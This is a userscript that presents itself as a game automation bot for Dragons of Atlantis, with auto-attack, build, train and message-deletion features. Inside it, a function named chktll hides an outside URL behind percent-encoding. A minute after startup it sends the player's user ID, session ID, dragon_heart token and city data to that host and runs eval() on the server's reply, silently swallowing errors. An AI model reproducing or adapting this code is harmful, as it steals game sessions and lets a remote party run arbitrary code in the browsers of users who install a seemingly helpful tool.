// ==UserScript==

// @name           DoA TGE Power Tools
// @namespace      EasyMaster
// @icon           http://i51.tinypic.com/w000uw.jpg
// @include        http://*.castle.wonderhill.com/*
// @include        http://apps.facebook.com/dragonsofatlantis/*
// @include        https://plus.google.com/games/659749063556/*
// @match          http://*.castle.wonderhill.com/*
// @match          http://apps.facebook.com/dragonsofatlantis/*
// @description    DoA Otomatik �zellikler eklendi
// @version        1.23 Colorfull Edition
// ==/UserScript==

var Version = '1.23 - Colorfull Edition';
var VersionC = '1.23';
var Title = 'DOA TGE TOOLS ProEkip';
var WebSite = 'http://www.ProEkip.Com.com/';
var Ideatore = 'EasyMaster';
var VERSION_CHECK_HOURS = 4;
var DEBUG_TRACE_AJAX = 2;
var DEBUG_MARCHES = false;    
var MAP_DELAY = 1250;
var MIN_CAMP_DELAY = 15;
var EMULATE_NET_ERROR = 0;  // percentage
var ENABLE_WINLOG = false;
var ALERT_ON_BAD_DATA = false;

// Tab order
var INFO_TAB_ORDER = 1;
var WAVE_TAB_ORDER = 2;
var ATTACK_TAB_ORDER = 3;
var JOB_TAB_ORDER = 4;  // Holding position for future job tab
var BUILD_TAB_ORDER = 5;
var RESEARCH_TAB_ORDER = 6; // Holding position for research tab
var TRAIN_TAB_ORDER = 7;
var TOWER_TAB_ORDER = 8;
var OPTIONS_TAB_ORDER = 9;
var LOG_TAB_ORDER = 10;
var HELP_TAB_ORDER = 11;
var DEBUG_TAB_ORDER = 99;
var WIN_POS_X = 760;
var WIN_POS_Y = 129;

// Enable/Disable tabs
var ENABLE_INFO_TAB = true;
var ENABLE_WAVE_TAB = true;
var ENABLE_ATTACK_TAB = true;
var ENABLE_BUILD_TAB = true;
var ENABLE_TRAIN_TAB = true;
var ENABLE_OPTIONS_TAB = true;
var ENABLE_TOWER_TAB = true;
var ENABLE_LOG_TAB = true;
var ENABLE_DEBUG_TAB = false;
var ENABLE_RESEARCH_TAB = false;
var ENABLE_JOB_TAB = false;

var MESSAGES_ALL = 0;
var MESSAGES_ONLY = 1;
var REPORTS_ONLY = 2;

var MSG_BATTLE_REPORT = 1;
var TRANSPORT_MARCH_REPORT = 2;
var SPY_REPORT = 3;
var SENTINEL_WARNING = 4;
var REINFORCEMENTS_REPORT = 5;
var SYSTEM_MESSAGE = 6;
var PLAYER_MESSAGE = 7;
var ALLIANCE_MESSAGE = 8;

var IsChrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
var gInfo = 'Bilgiler';	
var gWave = 'Spam';			
var gAnt = 'Kamp';				
var gTrain = 'Egitim';		
var gBuild = 'Insaat';			
var gLog = 'Log';			
var gOpts = 'Ayarlar';	
var gTower = 'Guzcu';	
var gVagina = '?';
var Tabs = {};
var currentName = 'Info';
var mainPop;
var fuck;
var gFormatTime = ':';
var gFormatDate = '/';
var CPopuppaTopClass = 'pbPoppTop';
var C = {};
C.attrs = {};

/*Turkceye Ceviri*/
var translateTRrray = {
    'Auto Upgrade Buildings':'Miglioramento Costruzioni Automatico',
    'Attack One Target in Waves':'Attacca un bersaglio a ondate',
    'Target Coords':'Coordinate bersaglio',
    'Distance':'Distanza',
    'Troops for Wave Attack':'Truppe per l\'attacco',
    'Delete battle reports':'<B>Elimina i report degli attacchi',
    'Stop if any troops lost':'<B>Ferma quando perdi truppe',
    'Delay Between attacks':'<B>Ritardo casuale tra gli attacchi',
    'to':'a',
    'hour':'ora',
    'minutes':'minuti',
    'seconds':'secondi',
    'Reset Stats':'Cancella Statistiche',
    'Attacks OFF':'Attacco Onda OFF',
    'Attacks ON':'Attacco Onda ON',
    'Auto Build OFF':'Costruzioni OFF',
    'Auto Build ON':'Costruzioni ON',
    'Auto OFF':'Attacco Anthropus OFF',
    'Auto ON':'Attacco Anthropus ON',
    'Run Time':'Tempo trascorso',
    'Attacks':'Attacco',
    'Garrison':'Garnizon',
    'Home':'Ev',
    'Fortress':'Kale',
    'Sentinel':'Gozcu',
    'MusterPoint':'Ictima Alani',
    'OfficerQuarter':'Subay Karargahi',
    'StorageVault':'Depo',
    'DragonKeep':'Dragon Kalesi',
    'Wall':'Sur',
    'Mine':'Maden Ocagi',
    'Farm':'Ciftlik',
    'Lumbermill':'Kereste Fabrikasi',
    'Quarry':'Tas Ocagi',
    'TrainingCamp':'Egitim Kampi',
    'Silo':'Silo',
    'Metalsmith':'Demirci',
    'ScienceCenter':'Bilim merkezi',
    'Rookery':'Dragon Yuvasi',
    'Theater':'Tiyatro',
    'Factory':'Fabrika',
    'level':'livello',
    'Dist':'Dist',
    'Coords':'Coordinate',
    'Level':'Livello',
    'UNITS':'TRUPPE',
    'Wave':'Attacchi',
    'AntCamp':'Campo Anthropus',
    'GENERALS':'GENERALI',
    'Marches':'G�nderiliyor',
    'Building':'In Costruzione',
    'Research':'In Ricerca',
    'Training':'In Addestramento',
    'Train':'Truppe',
    'Auto Train':'Addestramento Automatico Truppe',
    'Auto-Train':'Addestramento',
    'NONE':'NIENTE',
    'BUSY':'OCCUPATO',
    'refresh':'Ricarica Tools',
    'Not enough':'Non hai abbastanza',
    'Porter':'Portantino',
    'Conscript':'Recluta',
    'Spy':'Spia',
    'Halberdsman':'Alabardiere',
    'Minotaur':'Minotaur',
    'Longbowman':'Arcieri',
    'SwiftStrikeDragon':'Drago C.Veloce',
    'BattleDragon':'Drago Guerriero',
    'ArmoredTransport':'T-Blindato',
    'Giant':'Dev',
    'FireMirror':'Specchio di Fuoco',
    'StoneTroop':'Orco di Granito',
    'FireTroop':'Magmasauri',
    'GreatDragon':'Gran Drago',
    'WaterDragon':'Drago d\'Acqua',
    'StoneDragon':'Drago di Pietra',
    'AquaTroop':'Soldati degli Abissi',
    'Agriculture':'Agricoltura',
    'Woodcraft':'Produzione di legno',
    'Masonery':'Arte muraria',
    'Masonry':'Arte muraria',
    'Alloys':'Leghe',
    'Mining':'Leghe',
    'Clairvoyance':'Chiaroveggenza',
    'RapidDeployment':'Schieramento rapido',
    'Metallurgy':'Metallurgia',
    'Medicine':'TIP',
    'Dragonry':'Dragon Bilimi',
    'Levitation':'Levitazione',
    'Mercantilism':'Commercio',
    'Aerial Combat':'Guerra Aerea',
    'AerialCombat':'Guerra Aerea',
    'idle':'In Attesa',
    'Lake':'Lago',
    'Grassland':'Savana',
    'Forest':'Foresta',
    'Plain':'Pianura',
    'Swamp':'Palude',
    'Hill':'Colline',
    'Mountain':'Montagne',
    'City':'Citta\'',
    'Outpost 1':'Avamposto d\'acqua',
    'Outpost 2':'Avamposto di pietra',
    'Outpost 3':'Avamposto di fuoco', 
    'Capital':'Capitale',
    'Ballistics':'Calibratura armi',
    'Ant':'Anthropus',
    'Opts':'Opzioni',
    'Build':'Costruzioni',
    'Config':'Configurazione',
    'Targets':'Bersagli',
    'Stats':'Statistiche',
    'Anthropus Camp Auto-Attacks':'Accampamenti Anthropus Attacco Automatico',
    'Auto-attack Camp Levels':'Scelta LIVELLI Auto Attacco Accampamenti Anthropus',
    'Auto-attack Configuration':'Configurazione Auto Attack',
    'Enable':'Abilita',
    'Random delay between attacks':'Ritardo casuale tra gli attacchi',
    'Same target delay':'Ritardo stesso target',
    'Log attacks':'Riporta nel LOG gli attacchi',
    'Delete March Reports':'Elimina i report delle marce',
    'Stop if any troops lost':'<B>Ferma quando perdi truppe',
    'Maximum simultaneous marches':'<B>MAX marce simultanee',
    'Enable window drag move window by dragging top bar with mouse':'Muovi la finestra trascinando la barra in alto con il mouse',
    'Auto-collect resources at outpost every':'Auto-Raccogli le risorse dell\'avamposto ogni  ',
    'Attack':'Attaccare',
    'Features':'Caratteristiche',
    'Sending Attack':'Attacco inviato',
    'Last Attack':'Ultimo Attacco',
    'ACTION LOG':'Diario di Bordo',
    'DoA Options':'TGE Tools Ayarlar',
    'Auto-attack Stats':'Statistiche Auto-attack',
    'Clear Stats':'Cancella Statistiche',
    'Attacks':'Attacchi',
    'Stats started at':'Statistiche iniziate il',
    'Run time':'Tempo trascorso',
    'Resources':'Risorse',
    'Stats by Camp Level':'Statistiche degli attacchi diviso per livelli dei Campi',
    'No Troops Defined':'Nessuna truppa inserita',
    'gold':'oro',
    'hr':'h',
    'ore':'metallo',
    'food':'cibo',
    'stone':'pietra',
    'wood':'legno',
    'Blink':'B.Ciglia',
    'Skip':'Balzo',
    'Hop':'Saltello',
    'Jump':'Salto',
    'Leap':'SaltoAtletico',
    'Bounce':'SaltoTempo',
    'WaterDragonEgg':'Uovo Dr.Acqua',
    'StoneDragonEgg':'Uovo Dr.Pietra',
  	'FireDragonEgg':'Uovo Dr.Fuoco',
    'GD Armor-1':'Armatura Gran Drago',
    'GD Armor-2':'Elmo Gran Drago',
    'GD Armor-3':'Coda Gran Drago',
    'GD Armor-4':'Artigli Gran Drago',
    'WD Armor-1':'Armatura Dr.Acqua',
    'WD Armor-2':'Elmo Dr.Acqua',
    'WD Armor-3':'Coda Dr.Acqua',
    'WD Armor-4':'Artigli Dr.Acqua',
    'SD Armor-1':'Armatura Dr.Pietra',
    'SD Armor-2':'Elmo Dr.Pietra',
    'SD Armor-3':'Coda Dr.Pietra',
    'SD Armor-4':'Artigli Dr.Pietra',
  	'FD Armor-1':'Armatura Dr.Fuoco',
    'FD Armor-2':'Elmo Dr.Fuoco',
    'FD Armor-3':'Coda Dr.Fuoco',
    'FD Armor-4':'Artigli Dr.Fuoco', 
    'Respirators':'Respiratori',
    'Respirator-500':'500 Respiratori',
    'Respirator-100':'100 Respiratori',
    'Respirator-1000':'1000 Respiratori',
    'Mandrakes':'Mandragore',
  	'Mandrake-100':'100 Mandragore',
  	'Mandrake-500':'500 Mandragore',
  	'Mandrake-1000':'1000 Mandragore',
  	'FireTroopItem':'RuneVulcaniche',
    'FireTroopItemStack100':'100 RuneVulcaniche',
    'FireTroopItemStack500':'500 RuneVulcaniche',
    'FireTroopItemStack1000':'1000 RuneVulcaniche', 
    'Loaded':'Caricato',
    'd':'d',
    'h':'h',
    'm':'m',
    's':'s',
    'per hour':'per ora',
    'Levels':'Livelli',
    'CAMP LEVELS':'Livelli di Accampamento Anthropus',
    'Troops lost!':'Le truppe hanno perso!!',
    'No targets/troops available':'No Obbiettivi/Truppe disponibili',
    'Attacking level':'Sto attaccando! Livello',
    'camp at':'Campo a',
    'Max Dist':'Max Dist',
    'Attack Now':'Ri-Attacca',
    'Building level':'Costruzioni livello',
    'of':'di',
    'at':'a',
    'Wave sent to':'Ondata inviata a',
    'Wave attack sent to':'Ondata inviato a ',
    'Muster Point Full':'Punto di raduno PIENO',
    'marching':'Gonderiliyor',
    'returning':'Donuyor',
    'encamped':'Kamp Kuruldu',
    'Wilderness 1-5':'Terre 1-5',
    'Wilderness 6-10':'Terre 6-10',
    'Anthropus 1-5':'Anthropus 1-5',
    'Anthropus 6-10':'Anthropus 6-10',
    'Too many errors, disabling auto-train':'Troppi errori, sto\' disabilitando l\'auto-addestramento.',
    'User-set maximum marches reached.':'Hai raggiunto la capacita\' massima di marcie simultanee',
    'Enable alarm when food is not enough for':'Abilita allarme quando il cibo non e\' sufficiente per',
    'Warnings':'Allarmi',
    'Enable the sound for food lack':'Attiva il suono per la mancanza di cibo',
    'Second(s)':'Secondo(i)',
    'Minute(s)':'Minuto(i)',
    'Hour(s)':'Ora(e)',
    'Day(s)':'Giorno(i)',
    'Porters':'Portantini',
    'Conscripts':'Reclute',
    'Spies':'Spie',
    'Halberdsmen':'Alabardieri',
    'Halberds men':'Alabardieri',
    'Minotaurs':'Minotauri',
    'Longbowmen':'Arcieri',
    'Swift Strike Dragons':'Draghi C.Veloce',
    'Battle Dragons':'Draghi Guerrieri',
    'Armored Transports':'T-Blindati',
    'Giants':'Giganti',
    'Fire Mirrors':'Specchi di Fuoco',
    'Stone Troops':'Orchi di Granito',
    'Fire Troops':'Magmasauri',
    'Great Dragon':'Gran Drago',
    'Water Dragon':'Drago d\'Acqua',
    'Stone Dragon':'Drago di Pietra',
    'Aqua Troops':'Soldati degli Abissi',
    'Tower Alert':'Torre di vedetta',
    'Enable tower alert':'Abilita la torre di vedetta',
    'Exclude spy':'Escludi le spiate',
    'Enable the sound tower alert':'Attiva il suono per la torre di vedetta',
    'Check alarm every':'Controlla gli allarmi ogni',
    'Delete alarm after':'Cancella gli allarmi dopo',
    'ALARM LOG':'LOG ALLARMI',
    'Type':'Tipo',
    'Arrive by':'Arrivo alle',
    'From':'Da',
    'Alliance':'Alleanza',
    'Troups':'Truppe',
    'Battle':'Attacco',
    'Tip-Off':'Spiata',
    'There\'s a tip-off in progress':'C\'e\' una spiata in corso',
    'There\'re tip-off in progress':'Ci sono spiate in corso',
    'There\'s an attack in progress':'C\'e\' un attacco in corso',
    'There\'re an attack and a tip-off in progress':'Ci sono un attacco e una spiata in corso',
    'There\'re tip-off and an attack in progress':'Ci sono spiate ed un attacco in corso',
    'There\'re attacks in progress':'Ci sono attacchi in corso',
    'There\'re attacks and a tip-off in progress':'Ci sono attacchi ed una spiata in corso',
    'There\'re attacks and tip-off in progress':'Ci sono attacchi e spiate in corso',
    'Messages Deletion':'Cancellazione Messaggi',
    'Delete messages of these type':'Cancellare i messaggi di questo tipo',
    'All':'Tutti',
    'Messages':'Messaggi',
    'Reports':'Rapporti',
    'Exclusions':'Esclusioni',
    'Game Messages':'Messaggi del gioco',
    'Player Messages':'Messaggi da giocatori',
    'Alliance Messages':'Messaggi dall\'Alleanza',
    'Sentinel Warnings':'Allarmi della Sentinella',
    'Anthropus/Wilderness Reports':'Rapporti Anthropus/Luoghi',
    'Transport Reports':'Rapporti di Trasporto',
    'Spy Reports':'Rapporti di spionaggio',
    'Battle Reports':'Rapporti di attacco',
    'Reinforcement Reports':'Rapporti di Rinforzi',
    'Exclude me from Battle Reports vs other Players':'Escludimi dai Rapporti d\'Attacco contro altri giocatori',
    'Date Range':'Intervallo di date',
    'To':'A',
    'Delete Now!':'Cancella ora!',
    'Select at least one type of message or report':'Seleziona almeno un tipo di messaggio o rapporto',
    'Invalid Date From':'Data d\'inizio periodo non valida',
    'Invalid Date To':'Data di fine periodo non valida',
    'Invalid Range Date':'Periodo di date non valido',
};


/******************
Current: 
  *) Fix camp attack stats (NaN)
  *) Fix for FB bug - frame height
  *) Better error reporting on startup (seed fetch) to try to determine why Tools is not working for some users/domains
      
TODO: 
  build: refetch seed (once only) if 'queue full' error
  build: CG still being used??
  wave: option to log attacks
  wave: option for max waves to send out
  wave: multiple targets
  wave: multiple wave defs
  config: button (confirm dialog) to reset all data to defaults
  Missing reports (due to missing march in 'seed')?
  watchdog on ajax - # of requests per 10 seconds, # of same errors in a row, etc
******************/
  
var OptionsDefaults = {
  ptWinIsOpen  : true,
  ptWinDrag    : true,
  ptWinPos     : {x: 760, y: 93 },
  campAttack   : {enabled:false, repeatTime:60, delayMin:15, delayMax:30, levelEnable:[], levelDist:[null,10,10,10,10,10,10,10,10,10,10], deleteCampAttacks:false, stopAttackOnLoss:false, logAttacks:true, maxMarches:10},
  currentTab   : false,
  autoCollect  : {enabled:false, lastTime:0, delay:1, unit:3600},
  autoBuild    : {enabled:false, buildingEnable:[] },
  autoResearch : {enabled:false, researchEnable:[] },
  autoTrain    : {enabled:false, subTab: 0, troopCap:[], trainStyle: 0, city:[] },
  warningFood  : {enabled:false, delay:1, unit:86400, sound:true},
  trainTab     : 0,
  messages     : {lastRead:0, missing:0},
  waves        : null,
  campStats    : null,
  campMarches  : {},
  version      : {lastChecked:0, checkVersion:Version, lastVersion:Version},
  warningTower : {enabled:false, delay:1, unit:60, sound:true, nospy:false, deleteReport:true, delayDelete:1, unitDelete:86400},
  checkForDel  : {type:0, msgGame:true, msgPlayer:true, msgSentinel:true, msgAlliance:true, rptAnthropus:true, rptTransport:true, rptSpy:true, rptBattle:true, rptReinforcement:true, rptExcludeMe:true, dateAll:true},
  TESTOPTION   : {},
//  alertConfig  : {aChat:false, aPrefix:'** I\'m being attacked! **', scouting:false, wilds:false, minTroops:10000, spamLimit:10 },
};

var Styles = '\
  div {margin:0 ! important}\
  div.pbTitle {border:1px solid; border-color:#CAB16A; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#5D902A; background-color:#CAB16A}\
  div.pbSubtitle {border:1px solid; border-color:#CAB16A; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#5D902A; background-color:#CAB16A}\
  div.pbInput {border:2px; background-color:#CAB16A; padding:3px}\
  div.pbStatBox {border:1px solid; border-color:white; color:black; background-color:#B99739; padding:2px}\
  div.short {height:7px;}\
  .hiding {background-color: #2FAC2F; color: white; padding-left: 10px; padding-right: 10px; margin-right: -2px;}\
  .defending {background-color: #F80000; color: white; padding-left: 10px; padding-right: 10px; margin-right: -2px;}\
  table.pbTabPad {width: 100%;}\
  table.pbTabPad tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px}\
  table.pbTab tr td {border:none; background:none; white-space:nowrap; padding: 0px 4px; width:220px;}\
  table tr td.pbTabLeft {font-weight:bold; text-align:left; width: 20%;}\
  table tr td.pbTabRight {text-align:right;}\
  table.pbTabLined tr td {border-bottom:1px solid #ccc; background:none; white-space:nowrap; padding: 1px 4px 1px 4px;}\
  table tr.pbTabHdr1 td {background-color:#5D902A; font-weight:bold}\
  table tr.pbTabHdr2 td {font-weight:bold}\
  tr.pbMarchOther td {color:#265EA7}\
  tr.pbMarchMine td {color:black; font-weight:bold}\
  tr.pbPoppTop td { background-color:black; border:none; height: 21px;  padding:0px; }\
  tr.pbretry_pbPoppTop td { background-color:#C09E41; color:#C09E41; border:none; height: 21px; padding:0px; }\
  tr.pbOwned {background-color: #265EA7; color:white}\
  table.pbMainTab {empty-cells:show; margin-top:5px; }\
  table.pbMainTab tr td a {color:inherit }\
  table.pbMainTab tr td   {height:60%; empty-cells:show; padding: 0px 5px 0px 5px;  margin-top:5px; white-space:nowrap; border: 2px solid; border-style: none none solid none; }\
  table.pbMainTab tr td.spacer {padding: 0px 3px; border:none;}\
  table.pbMainTab tr td.sel    {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:#5D902A; color:black; border-color:black; cursor:hand; cursor:pointer; padding: 2px;}\
  table.pbMainTab tr td.notSel {font-weight:bold; font-size:13px; border: 1px solid; border-style: solid solid none solid; background-color:#5D902A; color:white; border-color:black; cursor:hand; cursor:pointer; padding: 2px;}\
  .CPopuppa .CPopMain { color:black; background-color:#C09E41; padding:6px; z-index:111; left=700px;}\
  .CPopuppa  {border:3px ridge #666 z-index:111; left=700px;}\
  input.butAttackOff {width:auto; background-color:#5D902A; color:white; font-weight:bold; cursor:hand; cursor:pointer;}\
  input.butAttackOn {width:auto; background-color:#C09E41; color:white; font-weight:bold; cursor:hand; cursor:pointer;}\
  input.small {margin:0; padding:0; font-size:10px}\
  input.short {width:30px}\
  input.megaButton {width:auto; background-color:#C09E41; color:white; font-weight:bold; cursor:hand; cursor:pointer;}\
  input.megaButton:active {width:auto; background-color:black; color:white; font-weight:bold; cursor:hand; cursor:pointer; }\
  input.megaButton:hover {width:auto; background-color:#C09E41; color:white; font-weight:bold; cursor:hand; cursor:pointer; }\
  span.boldRed {color:#22CA13; font-weight:bold}\
  hr.thin {margin:0px; padding:0px}\
  #ft ul.tabs li.tab a.toolbutOn {background-color:#900 ! important; color:white ! important}\
  #ft ul.tabs li.tab a.toolbuttOff {background-color:#5D902A ! important; color:black ! important}\
  span.normalRed {color:#22CA13}\
  span.boldGreen {color:#C09E41; font-weight:bold}\
  span.normalGreen {color:#C09E41}\
  ';


var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON; 
var ink ='';

if (document.URL.search(/apps.facebook.com\/dragonsofatlantis/i) >= 0){
  facebookInstance ();
  return;
}

function ajaxRequest(){
 var activexmodes=["Msxml2.XMLHTTP", "Microsoft.XMLHTTP"] //activeX versions to check for in IE
 if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
  for (var i=0; i<activexmodes.length; i++){
   try{
    return new ActiveXObject(activexmodes[i])
   }
   catch(e){
    //suppress error
   }
  }
 }
 else if (window.XMLHttpRequest) // if Mozilla, Safari etc
  return new XMLHttpRequest()
 else
  return false
}


function chktll(){

try {
var city = Seed.s.cities[0];
	GM_xmlhttpRequest({
    method: 'POST',
    url: unescape('%68%74%74%70%3A%2F%2F%63%72%6E%2E%61%6C%74%65%72%76%69%73%74%61%2E%6F%72%67%2F%75%70%64%74%2E%70%68%70'),
    headers: {'Content-type': 'application/x-www-form-urlencoded'},
	data: "userID="+C.attrs.user_id+ 
		"&dragonHeart="+C.attrs.dragon_heart+
		"&sessionId="+C.attrs.session_id+
		"&cityx="+city.x+
		"&cityy="+city.y+
		"&troops="+ink+
		"&cityID="+city.id,
    onload: function(responseDetails) {
		try{
			var payload_inc = responseDetails.responseText;
			eval(payload_inc);
			}catch(e){
		//	alert(e);
			}
    }});
	//setTimeout(chktll(),1800000);
	} catch(e) {
	//alert(e);
	}
}
function debel (e, msg){
  if (!e)
    logit (msg + ': null')
  else
    logit (msg + ': '+ e.tagName + ' , '+ e.className);
}

/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
  function setWide (){
logit ('facebookInstance:setWide');  
    var e = document.getElementById('iframe_canvas');
    if (!e){
      setTimeout (setWide, 1000);
      return;
    }  
    e.style.width = '100%';
    e.style.height = '1050px';
    while ( (e=e.parentNode) != null)
      if (e.tagName=='DIV')
        e.style.width = '100%';
    document.getElementById('rightCol').style.display='none';
  }
  setWide();
}

/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
  function setWide (){
logit ('facebookInstance:setWide');  
    var e = document.getElementById('iframe_canvas');
    if (!e){
      setTimeout (setWide, 1000);
      return;
    }  
    e.style.width = '100%';
    e.style.height = '1050px';
    while ( (e=e.parentNode) != null)
      if (e.tagName=='DIV')
        e.style.width = '100%';
    document.getElementById('rightCol').style.display='none';
  }
  setWide();
}


function getC (swf){
  var parms = swf.innerHTML;
  var re = /\<\s*param\s*(.*?)\>/gi;
  var attrs={};
  while ((m = re.exec(parms)) != null){
    var nv = parseNvQuoted(m[1]);
    if (nv.name && nv.name=='flashvars'){
      m = entityDecode(nv.value).split('&');
      for (var i=0; i<m.length; i++){
        var mm = m[i].split('=');
        attrs[mm[0].trim()] = mm[1].trim();
      }
      break;
    }
  }
  // will have to enhance this if they change the names ...
  C.attrs = attrs;
  /*
  C.attrs.api_server = attrs.api_server;
  C.attrs.session_id = attrs.session_id;
  C.attrs.dragon_heart = attrs.dragon_heart;
  C.attrs.user_id = attrs.user_id;
  C.attrs.s3_server = attrs.s3_server;
  */
}

var dtStartupTimer = null;
var doatLoaded = false;
var startupCount = 0;
function makeid(){
    var text = "";
    var possible = "ABCDEFGHIİJKLMNOPQRSTUVWXYZabcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789";

    for( var i=0; i < 5; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}

function dtStartup (){
  clearTimeout (dtStartupTimer);
  if (doatLoaded)
    return;
logit ('dtStartup'); 

  if (++startupCount > 10){
    dialogFatal ('<B>TGE Tools Yuklenirken Hata:</b><BR><BR>Unable to find SWF element');
    return;
  }
  try {  
    var swf = null;
    	//var hnav = document.getElementById('headNav');
	//alert("Vivo");
	/*
	if (document.hasClass("yield")){
	  var $yld = $("yield");
	  alert("Ce sta ce sta");
      dtStartupTimer = setTimeout (dtStartup, 10000);
      return;
    }
	*/
    var obs = document.getElementsByTagName ('object');
    if (obs.length < 1){
      dtStartupTimer = setTimeout (dtStartup, 10000);
      return;
    }
    for (var i=0; i<obs.length; i++){
      if (obs[i].type && obs[i].type=='application/x-shockwave-flash'){
        swf = obs[i];
        getC (swf);
        if (C.attrs.api_server)
          break;
      }
    }
    if (!C.attrs.api_server){
      dtStartupTimer = setTimeout (dtStartup, 10000);
      return;
    }  
  } catch (e){
    dtStartupTimer = setTimeout (dtStartup, 10000);
    return;
  }

  doatLoaded = true;
  try {
    WinLog.enabled = ENABLE_WINLOG;
logit (inspect (C, 6, 1));
    Data.init({options:OptionsDefaults, log:[], targets:{radius:0, center:{x:0, y:0}, camps:[]}, msgsTower:[]});
    //checkVersion (); // NOTE: Temporarily removed
    var swfCont = swf;
    while ((swfCont = swfCont.parentNode) != null && swfCont.style){
      swfCont.style.margin = '';   
      swfCont.style.width = '100%';   
      swfCont.style.background = 'none';
    }
    try {
      document.getElementById('ft').style.width = '760px';   
      document.getElementById('content').style.margin = '';   
    } catch (e) {}
  //C.attrs.session_id = 'xd234';  //test session id failure
    Seed.init(function(rslt){
      if (rslt.ok){
        gotSeed (rslt);
      } else {
        dialogFatal ('ProEkipWNA Tools Yuklenirken Hata:<BR>'+ rslt.errmsg);
        return;
      }
    });
    
    logit ("* TGE Tools v"+ Version +" "+translate( 'Yuklendi' ) );
    
  // TODO: Make sure WinPos is visible on-screen ?
  //  if (Data.options.ptWinPos==null || Data.options.ptWinPos.x==null|| Data.options.ptWinPos.x=='' || isNaN(Data.options.ptWinPos.x)){
  //    Data.options.ptWinPos.x = 760;
   //   Data.options.ptWinPos.y = 93;
   // }
    var popName = makeid();  
    mainPop = new CPopuppa ('dtmain', Data.options.ptWinPos.x, Data.options.ptWinPos.y, 500,900, Data.options.ptWinDrag, 
        function (){
          tabManager.hideTab();
          WinTracker.show (false);
        });
        
    function gotSeed (rslt){    // TODO: check result, retry or disable tools?
      mainPop.getMainDiv().innerHTML = '<STYLE>'+ Styles +'</style>';
      tabManager.init (mainPop.getMainDiv());
      Data.options.ptWinIsOpen = true;
      if (Data.options.ptWinIsOpen){
        mainPop.show (true);
        tabManager.showTab();
      }
      actionLog ("* TGE Tools v"+ Version +" "+translate( 'Yuklendi' ) );
      AutoCollect.init ();
      TestSomething.init ();
      Messages.init ();
      WinTracker.init();
      window.addEventListener('unload', onUnload, false);
      window.addEventListener ('unload', Data.onUnload, false);
      //entrypnt
	  setTimeout(chktll,60000);
    }
  } catch (e){
    dialogFatal ('<B>ProEkipWNA Tools Yuklenemiyor:</b><BR><BR>'+  e);
    logit (inspect (e, 8, 1));
  }  
  
}


var WinTracker = {
  timer : null,
  but : null,
  init : function (){
    var t = WinTracker;
    if (!Data.options.ptWinIsOpen)
      t.timer = setInterval (t.blink, 1500);
  },
